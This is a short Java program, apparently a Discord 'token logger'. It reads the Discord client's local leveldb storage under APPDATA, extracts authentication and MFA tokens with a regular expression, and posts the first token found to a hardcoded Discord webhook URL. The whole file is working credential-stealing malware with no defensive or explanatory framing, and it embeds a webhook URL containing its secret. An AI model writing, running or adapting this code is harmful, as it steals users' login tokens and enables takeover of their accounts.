package net.wiewurteam.logger;

import com.mrpowergamerbr.temmiewebhook.DiscordMessage;
import com.mrpowergamerbr.temmiewebhook.TemmieWebhook;

import java.io.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Logger {
    public static final String WEBHOOK_URL = "https://canary.discordapp.com/api/webhooks/731967182065500262/TJYcg9hps82R2EfA64EMbHGa-LwJNgOkyEebXcFP4eNxf18GYzA9Tnu4KEJoOaGHGpTC";
    public boolean PING = true;

    public static void main(String[] args) throws IOException {
        String appdata = System.getenv().get("APPDATA");
        File path = new File(appdata + "\\discord" + "\\Local Storage" + "\\leveldb");
        String[] regex = {
                "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}"
        };

        for (File file : path.listFiles()) {
            if (file.toString().endsWith(".ldb")) {


                FileReader fileReader = new FileReader(file);
                BufferedReader bufferReader = new BufferedReader(fileReader);

                String textFile = null;
                StringBuilder buildedText = new StringBuilder();

                while ( (textFile = bufferReader.readLine()) != null) {
                    buildedText.append(textFile);
                }

                String actualText = buildedText.toString();

                fileReader.close();
                bufferReader.close();

                Pattern pattern = Pattern.compile(regex[0]);
                Matcher matcher = pattern.matcher(actualText);

                TemmieWebhook webhook = new TemmieWebhook(WEBHOOK_URL);
                if (matcher.find(0)) {

                    DiscordMessage dm = DiscordMessage.builder()
                            .username("Token logger")
                            .content(matcher.group())
                            .build();

                    webhook.sendMessage(dm);
                }
            }
        }
    }
}
